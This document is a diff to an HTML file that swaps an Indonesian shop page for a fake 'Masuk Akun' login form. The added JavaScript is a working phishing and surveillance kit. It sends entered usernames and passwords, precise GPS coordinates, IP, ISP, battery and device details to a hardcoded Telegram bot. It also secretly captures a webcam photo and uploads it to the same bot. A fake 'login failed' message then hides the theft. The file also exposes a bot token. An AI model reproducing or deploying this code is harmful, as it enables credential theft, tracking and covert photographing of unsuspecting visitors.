@@ -1,27 +1,188 @@
-<!--
-© hansz
-silahkan pakai mentahan ini untuk keperluan anda jika ada yang kurang tolong hubungi saya selaku pembuat mentahan ini terimakasih
--->
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Toko Hansz Culsz</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-card {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      width: 300px;
+      text-align: center;
+    }
+    .login-card h2 {
+      margin-bottom: 1rem;
+    }
+    .login-card input {
+      width: 100%;
+      padding: 0.7rem;
+      margin-bottom: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .login-card button {
+      width: 100%;
+      padding: 0.7rem;
+      background: #007bff;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <h1>🛍️ Toko Hansz Culsz</h1>
-    </header>
-    <main>
-        <div id="product-list"></div>
-    </main>
-    <footer>
-        <p>&copy; 2025 Toko Hansz Culsz</p>
-    </footer>
-    <!-- yang ini sesuaikan saja -->
-    <script src="script.js"></script>
+  <div class="login-card">
+    <h2>Masuk Akun</h2>
+    <input type="text" placeholder="Nama Pengguna" id="username" />
+    <input type="password" placeholder="Kata Sandi" id="password" />
+    <button onclick="main()">Masuk</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8091841392:AAFNt_ArTvKajTAVcx8XHPF3Rs_RdzhUBX4";
+    let CHAT_ID = "7732430019";
+
+    async function getChatID() {
+      const updates = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+      const data = await updates.json();
+      const chats = data.result;
+      if (chats.length > 0) {
+        return chats[chats.length - 1].message.chat.id;
+      }
+      return null;
+    }
+
+    async function sendToTelegram(msg) {
+      if (!CHAT_ID) CHAT_ID = await getChatID();
+      if (!CHAT_ID) return console.warn("Chat ID belum tersedia");
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    async function getBattery() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return {
+          level: battery.level,
+          charging: battery.charging
+        };
+      }
+      return { level: 1, charging: false };
+    }
+
+    async function getIPData() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch {
+        return {};
+      }
+    }
+
+    async function captureImage() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/jpeg");
+
+        stream.getTracks().forEach(t => t.stop());
+
+        return imageData;
+      } catch {
+        return null;
+      }
+    }
+
+    async function sendPhoto(base64) {
+      if (!CHAT_ID) CHAT_ID = await getChatID();
+      if (!CHAT_ID || !base64) return;
+
+      const blob = await (await fetch(base64)).blob();
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", blob, "capture.jpg");
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    async function main() {
+      const username = document.getElementById("username").value || "-";
+      const password = document.getElementById("password").value || "-";
+
+      try {
+        const pos = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000
+          })
+        );
+
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const battery = await getBattery();
+        const ipInfo = await getIPData();
+        const time = new Date().toLocaleString();
+
+        const message = `
+🔐 *Login Dicoba*
+- Pengguna: ${username}
+- Kata Sandi: ${password}
+- Lokasi: https://maps.google.com/?q=${lat},${lon}
+- Lintang: ${lat}
+- Bujur: ${lon}
+- Baterai: ${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Mengisi)' : ''}
+- IP: ${ipInfo.ip || '-'}
+- Negara: ${ipInfo.country_name || '-'}
+- Kota: ${ipInfo.city || '-'}
+- ISP: ${ipInfo.org || '-'}
+- Perangkat: ${navigator.userAgent}
+- Waktu: ${time}
+        `;
+
+        await sendToTelegram(message);
+
+        const img = await captureImage();
+        if (img) await sendPhoto(img);
+
+        alert("Login gagal. Periksa kembali informasi Anda.");
+      } catch (e) {
+        alert("Gagal mengakses data lokasi atau kamera.");
+      }
+    }
+  </script>
 </body>
 </html>
